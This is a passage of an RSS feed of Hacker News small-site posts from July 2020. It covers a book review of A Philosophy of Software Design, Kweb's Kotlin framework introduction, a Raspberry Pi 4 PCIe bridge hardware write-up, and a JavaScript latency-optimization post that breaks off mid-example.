<p>That's pretty much it for this one, and if you like the new update please let me know on my <a href="https://twitter.com/MBrooksUK" target="_blank" rel="nofollow noopener noreferrer">Twitter page</a>.</p>
<p><a href="https://michaelbrooks.substack.com/p/website-migrated-from-vuepress-to" target="_blank" rel="nofollow noopener noreferrer">Join the discussion here.</a></p>
</div></div></div></div>]]>
            </description>
            <link>https://michaelbrooks.co.uk/website-migrated-from-vue-press-to-gridsome-posting-from-forestry/</link>
            <guid isPermaLink="false">hacker-news-small-sites-23701726</guid>
            <pubDate>Wed, 01 Jul 2020 14:30:07 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Book Review: A Philosophy of Software Design]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=23701564">thread link</a>) | @todsacerdoti
<br/>
July 1, 2020 | https://johz.bearblog.dev/book-review-philosophy-software-design/ | <a href="https://web.archive.org/web/*/https://johz.bearblog.dev/book-review-philosophy-software-design/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    <div><p>This review is largely in response to the article "<a href="https://qntm.org/clean">It's probably time to stop recommending Clean Code</a>", and the ensuing <a href="https://www.reddit.com/r/programming/comments/hhlvqq/its_probably_time_to_stop_recommending_clean_code/">Reddit discussion</a>.  A lot of really interesting points were brought up, but the big question that the author themself wasn't able to answer was: "What should we recommend instead?"</p>
<p>I believe the book we should be recommending is <em>A Philosophy of Software Design</em> by John Ousterhout.  In this post I want to spend a bit of time reviewing it and giving an overview of the contents, and then I want to explain why, in my opinion, it is such a good recommendation.</p>
<h2>An Empirical Philosophy Book</h2>
<p>The elevator pitch of John Ousterhout's book <em>A Philosophy of Software Design</em> is fairly simple: he is a university professor by profession (albeit one with almost two decades of experience in the "real world"), who each year teaches students how to actually design software in a practical, hands-on course where the students are expected to design and modify "a substantial piece of software" in an iterative way, hopefully understanding more about the practice of software design each time around.</p>
<p>The book, then, is a synthesis of the pieces of wisdom that Ousterhout has himself learned from his own experiences, tempered and refined by the practical examples he has been able to draw from his students.  In this way, it has a (somewhat) scientific, research-based approach, where the author's assertions are backed up with examples from student projects that worked (or didn't).</p>
<p>At it's core, though, this is still philosophy - the book doesn't just list the things that worked well, and the things that worked poorly.  Instead, Ousterhout attempts in each chapter to divine broader truths that apply to software design in general.  There are no lists of what to do and what not to do, but instead principles to follow, red flags to be aware of, and warnings against taking anything too far.</p>
<h2>Structure</h2>
<p>The book is split into a series of chapters, each of which generally explores a single principle.  These range from the very high level ("Working Code Isn't Enough", "Modules Should Be Deep") to the more practical questions ("Choosing Names").  The whole book is relatively short (about 180 pages), and many chapters flow together nicely, which means that it's quite easy to go from cover-to-cover, rather than approach the book as a reference manual.  That said, the final pages provide summaries of the design principles and red flags found in the book, making it easy to reference key parts of the book.</p>
<p>Within each chapter, Ousterhout generally starts by stating a problem or motivation that software engineers will face, and then defining a principle to solve this.  The rest of the chapter is then a discussion of the principle, the dangers of alternative approaches, the red flags that indicate that the principle needs to be applied (or in some cases avoided), and some notes about taking ideas too far.</p>
<p>The examples are often based on problems that Ousterhout has given his classes, which means that they generally feel meaty enough to be worth discussing.  An example of a text editor appears in Chapter 6, but is extended in Chapters 7, 8, 9, and 10 in different contexts.  Enough is omitted from most examples to make the point clear, but enough is kept in to give the feeling of real code.</p>
<h2>Ousterhout's Principles</h2>
<p>The overriding theme throughout the book is that good code <em>looks</em> good.  Ousterhout thinks very much in terms of abstraction and interfaces - where "interfaces" refers to the contact points between different units of abstraction, rather than any similarly-named construct in any particular language.  Most of the book is dedicated to figuring out how to spot bad abstractions and rework them into good abstractions.</p>
<p>To a certain extent, this feels at odds with certain common mantras in software engineering circles today, where we encourage enough other to Keep It Simple, Stupid, and worry about premature abstractions.  <em>Philosophy</em> seems to worry less about the dangers of over-abstraction, and more concerned with how to make sure that the chosen abstraction is a good one.</p>
<p>This approach makes for a more positive experience than in many other programming circles - rather than being warned into a very conservative approach, Ousterhout encourages his readers to go out and make abstractions, but to be careful about designing the correct ones.</p>
<p>This isn't to say that the book isn't also cautionary - in the summary pages at the back, the list of red flags gets more page space than the list of principles, and throughout the book these red flags mark out moments when readers are given the go ahead to use these abstraction techniques.  There are also warnings about when a principle might be used too much.</p>
<h2>Everyone's a Critic</h2>
<p>Beyond the mild danger of encouraging excess abstraction, the biggest issue in <em>Philosophy</em> is probably the missing parts - the topic of testing gets a single page in Chapter 19 (Software Trends), and ideas about effective use of a type system to avoid issues are largely ignored.  Ousterhout's principles will still apply in these areas, but it would be nice to see some more specific discussion of these areas.</p>
<h2>The Target Audience</h2>
<p>It can be a bit unclear at times to whom Ousterhout writes.  A lot of the examples clearly relate to his students, and the projects that they come from have a somewhat academic feel - a text editor here, and an HTTP protocol parser there.  The code in the examples is generally object-oriented (Java and occasional C++), although it generally feels like it could be replaced with most imperative/OO languages without much of an effect.</p>
<p>The use of the phrase "software design" might make one think more of broader software architecture, but Ousterhout uses it more to describe the design of individual modules and functions <em>within</em> a program, rather than the broader architecture of the program itself (although he occasionally touches on that).</p>
<p>More functionally-minded people might think they can simply side-step a lot of the discussion here, in the same way that they can when discussing the Gang of Four's design patterns, but the principle "design errors out of existence" (Chapter 10) and its corollary "design special cases out of existence" should ring bells for people in this area who are also aware of the principle of making illegal states unrepresentable.</p>
<p>Ultimately, I think this book aims at a space that is slightly deeper than a lot of existing software literature.  Where books like <em>Design Patterns</em>, Fowler's <em>Refactoring</em>, and the aforementioned <em>Clean Code</em> are aimed at more traditional "enterprise" software development, <em>Philosophy</em> feels more widely applicable, albeit at the cost of being more abstract and difficult to apply.</p>
<p>In general, I think <em>Philosophy</em> is a good read if you are both (a) working with software regularly, and (b) conscious of the inherent maintenance cost in software, and aiming to minimise it.</p>
<h2>A Book to Recommend</h2>
<p>The original question I wanted to answer was what we, as software engineers, should recommend over books like <em>Clean Code</em>.  As I said, my answer to that question is <em>A Philosophy of Software Design</em>.</p>
<p>Software engineering (indeed, engineering in general) is not a science, insofar as there are no (or at least very few) exact answers.  Everything from the database you use to your choice of testing strategy will be dependent on the context of the software you're writing.  This means that the advice that we give to each other will probably be very context-specific.  In general, you probably shouldn't use a NoSQL database, but in a lot of specific contexts you probably should.</p>
<p>This isn't a problem if we don't run into these exceptional cases often, but engineering is all about exceptional cases - if there were no exceptional cases, we wouldn't need to write any new software, because our existing tools would do the job.  This is where books like <em>Philosophy</em> come in - rather than give situational advice, it attempts to define wider principles that the reader will then need to apply to different situations.</p>
<p>Take, for example, my favourite principle: "Modules should be deep" (explored in Chapter 4).  The idea is that an individual unit of abstraction should do a lot of work (i.e. be deep, and contain a lot of complexity), but it should have a relatively simple interface (i.e. be narrow).  Essentially, if you're going to abstract something, make sure your abstraction is deep.</p>
<p>Notice that this principle says nothing about functions, classes, lines, blocks, parameters, or anything specific to a single language or paradigm.  However, when we apply it, for example to the Java code Robert C. Martin talks about in <em>Clean Code</em>, we can derive some of his ideas from this principle.  Assuming a function is our unit of abstraction (for now, at least), the parameters are its interface, therefore we should reduce the number of parameters to the minimum necessary.</p>
<p>However, because our principle is more general, we can actually correct some of the mistakes Martin makes.  Martin talks about removing parameters by adding private fields to the class that the method belongs to.  When we think in terms of interfaces, we notice that this <em>hasn't decreased the interface at all</em> - we've lost a parameter, but we've gained a private field, and in the process made things harder for the consumer of our abstraction.</p>
<h2>Teaching Principles Over Rules</h2>
<p>When I recommend books, I generally hope that the other person will learn something from the book I have suggested.  If I were to recommend <em>Clean Code</em>, I would hope that the reader would learn something about how to write clean Java code, but I suspect they would mainly learn how to write code like Robert C. Martin - or more accurately, like someone copying Robert C. Martin's actions without always understanding why he's taking them.</p>
<p>I do not feel this way about <em>A Philosophy of Software Design</em>.  When I recommend it, I expect that the reader will not just learn something about Java, …</p></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://johz.bearblog.dev/book-review-philosophy-software-design/">https://johz.bearblog.dev/book-review-philosophy-software-design/</a></em></p>]]>
            </description>
            <link>https://johz.bearblog.dev/book-review-philosophy-software-design/</link>
            <guid isPermaLink="false">hacker-news-small-sites-23701564</guid>
            <pubDate>Wed, 01 Jul 2020 14:17:48 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Show HN: Kweb – A tiny Kotlin web framework for server-side developers]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=23701479">thread link</a>) | @s4n1ty
<br/>
July 1, 2020 | http://docs.kweb.io/en/latest/intro.html | <a href="https://web.archive.org/web/*/http://docs.kweb.io/en/latest/intro.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page">

   
  <div>
    
    <nav data-toggle="wy-nav-shift">
      
    </nav>

    <section data-toggle="wy-nav-shift">

      
      <nav aria-label="top navigation">
        
          <i data-toggle="wy-nav-top"></i>
          <a href="http://docs.kweb.io/en/latest/index.html">Kweb</a>
        
      </nav>


      <div>
        
        <div>
        
          
















          <div role="main" itemscope="itemscope" itemtype="http://schema.org/Article">
           <div itemprop="articleBody">
            
  <div id="introduction">

<div id="motivation">
<h2>Motivation<a href="#motivation" title="Permalink to this headline">¶</a></h2>
<p>Modern websites consist of at least two <a href="https://en.wikipedia.org/wiki/Coupling_(computer_programming)">tightly coupled</a> components, one runs in the browser, the other on the server.  These are often written in different programming languages and must communicate with each other over an HTTP connection.</p>
<p>Kweb’s goal is to eliminate this server/browser separation so that your webapp’s architecture is determined by the problem you’re solving, rather than the limitations of today’s tools.</p>
</div>
<div id="how-does-it-work">
<h2>How does it work?<a href="#how-does-it-work" title="Permalink to this headline">¶</a></h2>
<p>Kweb is a self-contained Kotlin library that can be added easily to new or existing projects.  When Kweb receives
a HTTP request it responds with the initial HTML page, and some JavaScript that connects back to the web server via a WebSocket.  The page then waits and listens for instructions from the server, while notifying the server of relevant browser events.</p>
<p>A common concern about this approach is that the user interface might feel sluggish if it is server driven. Kweb solves this problem by <a href="https://docs.kweb.io/en/latest/events.html#immediate-events">preloading</a> instructions to
the browser to be executed immediately on browser events without a server round-trip.</p>
<p>We’ve designed Kweb to be efficient in both the browser and server, and makes effective use of Kotlin’s concurrency features, particularly <a href="https://kotlinlang.org/docs/reference/coroutines-overview.html">coroutines</a>.</p>
</div>
<div id="features">
<h2>Features<a href="#features" title="Permalink to this headline">¶</a></h2>
<ul>
<li>Allows the problem to determine your architecture, not the server/browser divide</li>
<li>End-to-end Kotlin (<a href="https://steve-yegge.blogspot.com/2017/05/why-kotlin-is-better-than-whatever-dumb.html?m=1">Why Kotlin?</a>)</li>
<li>Keep the web page in sync with your back-end data in realtime, Kweb does all the plumbing for you</li>
<li>Server-side HTML rendering with <a href="https://developers.google.com/web/updates/2019/02/rendering-on-the-web">rehydration</a></li>
<li>Efficient instruction preloading to avoid unnecessary server communication</li>
<li>Very lightweight, Kweb is less than 5,000 lines of code</li>
</ul>
</div>

</div>


           </div>
           
          </div>
          

        </div>
      </div>

    </section>

  </div>
  

  



  

  
   


</div>]]>
            </description>
            <link>http://docs.kweb.io/en/latest/intro.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-23701479</guid>
            <pubDate>Wed, 01 Jul 2020 14:10:41 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Raspberry Pi 4 PCIe bridge “chip”]]>
            </title>
            <description>
<![CDATA[
Score 224 | Comments 154 (<a href="https://news.ycombinator.com/item?id=23701208">thread link</a>) | @fanf2
<br/>
July 1, 2020 | https://blog.zakkemble.net/rpi4-pci-express-bridge-chip/ | <a href="https://web.archive.org/web/*/https://blog.zakkemble.net/rpi4-pci-express-bridge-chip/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div> <p>After seeing the work done by <a rel="noreferrer noopener" href="http://mloduchowski.com/en/blog/raspberry-pi-4-b-pci-express/" target="_blank">Thomasz Mloduchowski</a> and <a rel="noreferrer noopener" href="http://labs.domipheus.com/blog/raspberry-pi-4-pci-express-it-actually-works-usb-sata-gpu/" target="_blank">Colin Riley</a> with managing to bridge the Raspberry Pi 4’s PCI-Express bus to a USB 3.0 port, and then seeing <a rel="noreferrer noopener" href="https://hackaday.com/2019/09/05/pcie-multiplier-expands-raspberry-pi-4-possibilities/#comment-6177569" target="_blank">these comments on hack-a-day</a>, I thought I would give it a go too!</p> <p>So, here’s a PCIe bridge “chip” that simply replaces the VL805 USB 3.0 controller chip on the Pi, giving access to the PCI-Express bus on a USB 3.0 port. <s>However, this does mean losing all USB functionality of the Pi. That could be a bit of a problem if you ever mess up the networking and need to attach a keyboard.</s> Never mind, it seems that the USB-C power connector <a rel="noreferrer noopener" href="https://www.raspberrypi.org/forums/viewtopic.php?f=29&amp;t=246348&amp;p=1678554" target="_blank">can run as a USB host</a>, allowing a keyboard to be connected if 5V power is supplied through the GPIO header instead.</p> <div><figure><a href="https://blog.zakkemble.net/wp-content/uploads/2020/06/rpi4_bridge_chip.jpg" target="_blank" rel="noopener noreferrer"><img src="https://blog.zakkemble.net/wp-content/uploads/2020/06/rpi4_bridge_chip-1024x454.jpg" alt="" width="848" height="375" srcset="https://blog.zakkemble.net/wp-content/uploads/2020/06/rpi4_bridge_chip-1024x454.jpg 1024w, https://blog.zakkemble.net/wp-content/uploads/2020/06/rpi4_bridge_chip-300x133.jpg 300w, https://blog.zakkemble.net/wp-content/uploads/2020/06/rpi4_bridge_chip-768x341.jpg 768w, https://blog.zakkemble.net/wp-content/uploads/2020/06/rpi4_bridge_chip-1536x681.jpg 1536w, https://blog.zakkemble.net/wp-content/uploads/2020/06/rpi4_bridge_chip.jpg 1761w" sizes="(max-width: 848px) 100vw, 848px"></a></figure></div> <p>The bridge “chip” is a 0.8mm thick PCB from OSHPark with copper pads in the same locations as a real VL805 QFN68 IC package, then traces connecting the PCIe pads to the USB pads that connect to the upper USB 3.0 port. RESET, WAKE and a few other signals were also connected to the lower USB 3.0 port.</p> <figure><table><thead><tr><th>PCIe Signal</th><th>Direction</th><th>USB Signal</th></tr></thead><tbody><tr><td>REFCLK+</td><td>Host -&gt; Device</td><td>D-</td></tr><tr><td>REFCLK-</td><td>Host -&gt; Device</td><td>D+</td></tr><tr><td>HSO+</td><td>Host (TX) -&gt; Device (RX)</td><td>RX-</td></tr><tr><td>HSO-</td><td>Host (TX) -&gt; Device (RX)</td><td>RX+</td></tr><tr><td>HSI+</td><td>Device (TX) -&gt; Host (RX)</td><td>TX-</td></tr><tr><td>HSI-</td><td>Device (TX) -&gt; Host (RX)</td><td>TX+</td></tr><tr><td>RESET</td><td>Host -&gt; Device</td><td>D- (lower port)</td></tr><tr><td>WAKE (not connected anywhere)</td><td>Device -&gt; Host</td><td>D+ (lower port)</td></tr><tr><td>CLKREQ</td><td>Host -&gt; Device</td><td>RX+ (lower port)</td></tr><tr><td>PONRST</td><td>Not a PCIe signal, connected like a reset pin on a microcontroller.</td><td>RX- (lower port)</td></tr></tbody></table><figcaption>HSI and HSO (in and out) are from the perspective of the host controller. Where host HSO/TX will connect to device RX and host HSI/RX to device TX. Man, this is really confusing with TX, RX, device, host, passing through USB, which side is which… 😕</figcaption></figure> <p>There’s also a small hole near the centre, this allows any leftover solder from the large ground pad to have somewhere to go when placing the chip, otherwise the solder could end up squashed out around the edge, shorting out the pads. The PCB is slightly larger than the QFN68 package, as there is a limit on how close the copper can be to the edge. The fabricated PCB should be sanded down to the correct size, so that the cross-section of the copper pads can be seen at the edge of the PCB, just like on a QFN package.</p> <div><figure><a href="https://blog.zakkemble.net/wp-content/uploads/2020/06/chip_pads_cross.jpg" target="_blank" rel="noopener noreferrer"><img src="https://blog.zakkemble.net/wp-content/uploads/2020/06/chip_pads_cross-1024x768.jpg" alt="" srcset="https://blog.zakkemble.net/wp-content/uploads/2020/06/chip_pads_cross-1024x768.jpg 1024w, https://blog.zakkemble.net/wp-content/uploads/2020/06/chip_pads_cross-300x225.jpg 300w, https://blog.zakkemble.net/wp-content/uploads/2020/06/chip_pads_cross-768x576.jpg 768w, https://blog.zakkemble.net/wp-content/uploads/2020/06/chip_pads_cross-1536x1152.jpg 1536w, https://blog.zakkemble.net/wp-content/uploads/2020/06/chip_pads_cross.jpg 1760w" sizes="(max-width: 1024px) 100vw, 1024px"></a></figure></div> <div><figure><a href="https://blog.zakkemble.net/wp-content/uploads/2020/06/IMG_20200612_115732_BURST2.jpg" target="_blank" rel="noopener noreferrer"><img src="https://blog.zakkemble.net/wp-content/uploads/2020/06/IMG_20200612_115732_BURST2-1024x768.jpg" alt="" srcset="https://blog.zakkemble.net/wp-content/uploads/2020/06/IMG_20200612_115732_BURST2-1024x768.jpg 1024w, https://blog.zakkemble.net/wp-content/uploads/2020/06/IMG_20200612_115732_BURST2-300x225.jpg 300w, https://blog.zakkemble.net/wp-content/uploads/2020/06/IMG_20200612_115732_BURST2-768x576.jpg 768w, https://blog.zakkemble.net/wp-content/uploads/2020/06/IMG_20200612_115732_BURST2-1536x1152.jpg 1536w, https://blog.zakkemble.net/wp-content/uploads/2020/06/IMG_20200612_115732_BURST2-2048x1536.jpg 2048w" sizes="(max-width: 1024px) 100vw, 1024px"></a></figure></div> <center></center> <p>After replacing the VL805 with the bridge chip I tried a few PCIe cards that were laying around, the first was a Realtek RTL8168 based ethernet adapter… it didn’t work. Then I tried an ASMedia ASM1083 PCIe to PCI converter, that didn’t work either. I looked over all solder joints, checked for continuity, shorts, and everything seemed fine. I tried all kinds of things, like removing the capacitors and swapping the + and – of each signal in case they were swapped at the device end, as this is a feature of PCIe called <a rel="noreferrer noopener" href="https://teledynelecroy.com/doc/understanding-lane-reversal-and-polarity" target="_blank">polarity inversion</a> that maybe the controller did not support. The Pi just would not detect them. It seemed to be unable to train the PCIe link as <code>dmesg</code> showed <code>link down</code> instead of <code>link up, 2.5 Gbps x1 (!SSC)</code>. In the end I ordered a USB 3.0 expansion card containing a VL805, the same as the Pi. When it eventually arrived, I plugged it in and it was detected first time! I found a Realtek RTL8111 based ethernet adapter, and that worked too! After installing the driver for the RTL8111 it was able to obtain an IP from the DHCP server and I could ping the interface.</p> <div><figure><img src="https://blog.zakkemble.net/wp-content/uploads/2020/06/lspci_rpi4.png" alt="" srcset="https://blog.zakkemble.net/wp-content/uploads/2020/06/lspci_rpi4.png 628w, https://blog.zakkemble.net/wp-content/uploads/2020/06/lspci_rpi4-300x30.png 300w" sizes="(max-width: 628px) 100vw, 628px"></figure></div> <p>I wonder what it is about the RTL8168 and ASM1083 that makes them incompatible with the Raspberry Pi? Maybe they just don’t like the PCIe signals running through a load of USB connectors and cables.<br><strong>UPDATE 1:</strong> Using an ASM1184e PCIe switch and these two expansion cards are still not detected, so probably not signal issues. The device trees file has been modified to allow more than one PCIe device, as described in Colins blog post. Other cards work in the switch, just not these two.<br><strong>UDPATE 2:</strong> Nevermind, the problem with the ASM1083 was that I hadn’t connected the 5V rail, and is now detected by the Pi. RTL8168 still doesn’t work for some reason.</p> <div><figure><a href="https://blog.zakkemble.net/wp-content/uploads/2020/06/IMG_20200612_164557_BURST2.jpg" target="_blank" rel="noopener noreferrer"><img src="https://blog.zakkemble.net/wp-content/uploads/2020/06/IMG_20200612_164557_BURST2-1024x768.jpg" alt="" srcset="https://blog.zakkemble.net/wp-content/uploads/2020/06/IMG_20200612_164557_BURST2-1024x768.jpg 1024w, https://blog.zakkemble.net/wp-content/uploads/2020/06/IMG_20200612_164557_BURST2-300x225.jpg 300w, https://blog.zakkemble.net/wp-content/uploads/2020/06/IMG_20200612_164557_BURST2-768x576.jpg 768w, https://blog.zakkemble.net/wp-content/uploads/2020/06/IMG_20200612_164557_BURST2-1536x1152.jpg 1536w, https://blog.zakkemble.net/wp-content/uploads/2020/06/IMG_20200612_164557_BURST2-2048x1536.jpg 2048w" sizes="(max-width: 1024px) 100vw, 1024px"></a></figure></div> <p>A quick test using 4 USB 3.0 flash drives plugged into the VL805 expansion card resulted with a total read throughput of 3 Gbps out of a maximum theoretical throughput of 4 Gbps over a 5 Gbps PCIe 2.0 link. The flash drives had their read speeds almost maxed out, probably slowed down slightly from overhead of having to switch between each drive while reading.<br><strong>UPDATE: </strong>Another test with 5 USB flash drives, a USB hub and a USB-to-Ethernet adapter resulted in 3 Gbps again, so this seems like a limitation of the VL805 or CPU. Other RPi4 benchmarks using SSDs through USB 3 also maxed out at 3 Gbps.</p> <p>The RESET and WAKE traces on the riser board should be cut, otherwise RESET will be connected to GND preventing the card from starting and WAKE will be connected to 5V possibly damaging the device if that pin is not 5V tolerant. The RESET line should then have a 10k pullup connected to the 3.3V supply, or connected to the D- signal of the lower USB 3.0 port of the Pi.</p> <p>Colin mentioned that Thomasz also had kernel panic problems with his setup, I had a few panics and freezes too, but they seemed to be caused by wiggling the PCIe card a little too much.</p> <p><a rel="noreferrer noopener" href="https://docs.turris.cz/hw/mox/Turris_Mox_F.pdf" target="_blank">This pdf</a> has a full schematic using a VL805 on pages 7 and 8 (pictured below), very handy since any information about the chip is scarce.</p> <div><figure><a href="https://blog.zakkemble.net/wp-content/uploads/2020/06/Turris_Mox_F-pg7_8.png" target="_blank" rel="noopener noreferrer"><img src="https://blog.zakkemble.net/wp-content/uploads/2020/06/Turris_Mox_F-pg7_8-150x150.png" alt=""></a></figure></div> <p>These “chips” are available to buy from my <a href="https://www.tindie.com/products/20478/" target="_blank" rel="noreferrer noopener">Tindie store</a>! Or they can be ordered directly from me, send an email to shop@zakkemble.net</p> <div><figure><a href="https://www.tindie.com/products/20478/" target="_blank" rel="noopener noreferrer"><img src="https://blog.zakkemble.net/wp-content/uploads/2020/02/tindie_robodog.png" alt=""></a></figure></div> <p><strong>PCB designs and things are on <a rel="noreferrer noopener" href="https://github.com/zkemble/RPi4-PCIe-Bridge" target="_blank">GitHub</a></strong></p> </div></div>]]>
            </description>
            <link>https://blog.zakkemble.net/rpi4-pci-express-bridge-chip/</link>
            <guid isPermaLink="false">hacker-news-small-sites-23701208</guid>
            <pubDate>Wed, 01 Jul 2020 13:43:08 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[A tale of latency and broken windows]]>
            </title>
            <description>
<![CDATA[
Score 38 | Comments 16 (<a href="https://news.ycombinator.com/item?id=23700897">thread link</a>) | @yenkel
<br/>
July 1, 2020 | https://yenkel.dev/posts/a-tale-of-latency-and-broken-windows | <a href="https://web.archive.org/web/*/https://yenkel.dev/posts/a-tale-of-latency-and-broken-windows">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><div><p>As a software developer you might be familiar with <a href="http://norvig.com/21-days.html#answers" target="_blank" rel="nofollow noopener noreferrer">the following table</a><a name="latency-table"></a>:
<img src="https://yenkel.dev/media/2020-06-27/latency.png"></p><p>Even if the times are not exact and up to date for 2020, the gist of it is clear. Some operations (disk, network) are more expensive than others. When looking to minimize latency, start from operations that are more likely to take longer, because they are naturally slower due to hardware and speed of light limitations.</p><p>The importance of latency will depend on the software you are writing. For some software latency can business critical:</p><ul><li><a href="https://en.wikipedia.org/wiki/Real-time_computing" target="_blank" rel="nofollow noopener noreferrer">Real-time computing</a> where operations must guarantee completion under a deadline.</li><li>A SaaS with latency SLAs that you need to meet for your enterprise customers </li><li>e-commerce that loses money when the site is slow (see this great blog post about <a href="http://blog.tacertain.com/p-four-nines/" target="_blank" rel="nofollow noopener noreferrer">Amazon</a>).</li></ul><p>You might also be writing software that you want to be “fast enough” or “not unnecessarily slow”.</p><p>While getting to concrete latency guarantees for critical cases requires a lot of work and investment, it is also true that latency is one of those things that is easy to overlook unless you are paying attention. Over time, small decisions can pile up and you can end up with a product that is a lot slower than it should be mostly because of <a href="http://faculty.salisbury.edu/~xswang/Research/Papers/SERelated/no-silver-bullet.pdf" target="_blank" rel="nofollow noopener noreferrer">accidental complexity, not essential complexity</a>. </p><p>The “broken windows” theory presents the problem in a nice way (From <a href="https://en.wikipedia.org/wiki/Broken_windows_theory" target="_blank" rel="nofollow noopener noreferrer">wikipedia</a>): <em>The broken windows theory is a criminological theory that states that visible signs of crime, anti-social behavior, and civil disorder create an urban environment that encourages further crime and disorder, including serious crimes. The theory suggests that policing methods that target minor crimes such as vandalism, loitering, public drinking, jaywalking and fare evasion help to create an atmosphere of order and lawfulness, thereby preventing more serious crimes.</em>
<img src="https://yenkel.dev/media/2020-06-27/broken-windows.jpg"></p><p>Whether the theory is correct or not (there is an interesting chapter on this in the book <a href="https://www.amazon.com/Freakonomics-Economist-Explores-Hidden-Everything/dp/0060731338" target="_blank" rel="nofollow noopener noreferrer">Freakonomics</a>) it is a useful context to talk about software. In the software industry, the Pragmatic Programmer book states <a href="https://www.artima.com/intv/fixit.html" target="_blank" rel="nofollow noopener noreferrer">“don’t live with broken windows”</a>.
If we apply this to latency it is easy to reason that if you let small decisions/changes increase latency, over time the latency of the system will continuously increase over time. At some point, going back and figuring things out will be overly complex and sometimes teams decide to go for complicated solutions to solve this problem. We want to avoid that.</p><p>One of the things we do at <a href="http://auth0.com/" target="_blank" rel="nofollow noopener noreferrer">Auth0</a> is iterative delivery. Initial versions of code work and are tested, etc., but until we validate features with customers we avoid investing in optimizations. </p><p>However, some things can be done in an initial implementation so we don’t need to optimize later, as that’s when as a developer you have the context about what you are doing. Re-thinking many small decisions a few weeks down the road is less than ideal. In this context, thinking about “expensive operations” latency wise is useful.</p><p>As part of a project, we are working on developing a new service (<code>new-service</code>) and adding some calls to it from an existing service (<code>client</code>). As we reviewed the changes we made to the <code>client</code> with the team, we found several opportunities for improvement.</p><p>The code snippets below are examples written using Javascript, but these ideas are language agnostic.</p><h2 id="parallel-io"><a href="#parallel-io" aria-label="parallel io permalink"></a>Parallel I/O</h2><blockquote><p>When I/O ops do not depend on each other and you need all data if possible use parallel queries.</p></blockquote><p>Let’s say a change to client code looked like this:</p><div data-language="js"><pre><code>     <span>const</span> a <span>=</span> <span>await</span> <span>callExistingService</span><span>(</span><span>...</span><span>)</span><span>;</span>
<span>+</span>    <span>const</span> b <span>=</span> <span>await</span> <span>callNewService</span><span>(</span><span>...</span><span>)</span><span>;</span>
<span>+</span>    </code></pre></div><p>The <code>getDataFromNewService(...)</code> call performs network I/O. Because we are working on this <code>new-service</code>, we know it also does more network I/O to talk to a database (which might need to do some disk I/O). All of these operations are naturally in the slow end of the spectrum from the <a href="#latency-table">table at the beginning of this blog post</a>.</p><p>If we can’t avoid the operations, performing these in parallel yields some clear benefits. If the resulting code looks like this:</p><div data-language="js"><pre><code><span>const</span> <span>[</span>a<span>,</span> b<span>]</span> <span>=</span> <span>await</span> Promise<span>.</span><span>all</span><span>(</span><span>[</span>
    <span>callExistingService</span><span>(</span><span>...</span><span>)</span><span>,</span> 
    <span>callNewService</span><span>(</span><span>...</span><span>)</span>
<span>]</span><span>)</span><span>;</span></code></pre></div><p>If we call the time for these operations <code>t1</code> (<code>existing-service</code>) and <code>t2</code> (<code>new-service</code>), in the last example we change the latency from <code>sum(t1, t2)</code> to <code>max(t1, t2)</code>. That even means that if we don’t want to make latency higher than the original, all we need to do is ensure <code>t2 &lt;= t1</code>!</p><h2 id="pre-fetching"><a href="#pre-fetching" aria-label="pre fetching permalink"></a>Pre-fetching</h2><blockquote><p>When I/O operations op2 only runs if op1 is likely to be successful, if op1 is likely to be successful in most cases, consider doing op2 in parallel (<a href="https://en.wikipedia.org/wiki/Prefetching" target="_blank" rel="nofollow noopener noreferrer">pre-fetching</a>).</p></blockquote><p>This case is similar to the previous one, but might be easier to miss. Let’s say the code after the change looks like this:</p><div data-language="js"><pre><code>    <span>const</span> param <span>=</span> <span>...</span>
    <span>const</span> exists <span>=</span> <span>await</span> <span>callExistingService</span><span>(</span>param<span>)</span><span>;</span>
    <span>if</span> <span>(</span><span>!</span>exists<span>)</span> <span>{</span>
        
    <span>}</span>
<span>+</span>   <span>const</span> b <span>=</span> <span>await</span> <span>callNewService</span><span>(</span>param<span>)</span><span>;</span>
<span>+</span>   </code></pre></div><p>Both function calls depend on <code>param</code>, which is available before calling <code>callExistingService(param)</code>. If the likelihood of <code>exists</code> being false is low, then calling <code>callNewService(param)</code> in parallel is likely worth it. You won’t be adding a lot more load to <code>new-service</code> in case <code>exists === false</code>, but you will be getting the aforementioned benefits for parallel I/O.</p><p>The latency improved code would look like this:</p><div data-language="js"><pre><code><span>const</span> param <span>=</span> <span>...</span>
<span>const</span> <span>[</span>exists<span>,</span> b<span>]</span> <span>=</span> <span>await</span> Promise<span>.</span><span>all</span><span>(</span><span>[</span>
  <span>callExistingService</span><span>(</span>param<span>)</span><span>,</span> 
  <span>callNewService</span><span>(</span>param<span>)</span><span>]</span><span>)</span><span>;</span>

<span>if</span> <span>(</span><span>!</span>exists<span>)</span> <span>{</span>
    
<span>}</span>
</code></pre></div><h2 id="no-op"><a href="#no-op" aria-label="no op permalink"></a>No-op</h2><blockquote><p>When you can replace an I/O operation for a no-op, do it.</p></blockquote><p>The best performance/latency optimization is a “no-op”, i.e. figuring out how to prevent the call from happening. A simple way of doing this is caching. However, it is important to consider that caching does not need to be overly complicated and require every developer’s favorite hammer <a href="https://redis.io/" target="_blank" rel="nofollow noopener noreferrer">Redis</a>. It just means <em>to store the value of computation to prevent performing the computation again</em>. </p><p>The code we reviewed was doing this:</p><div data-language="js"><pre><code>    
    <span>const</span> context <span>=</span> <span>await</span> <span>hydrateContext</span><span>(</span><span>)</span><span>;</span>
    <span>...</span>
    
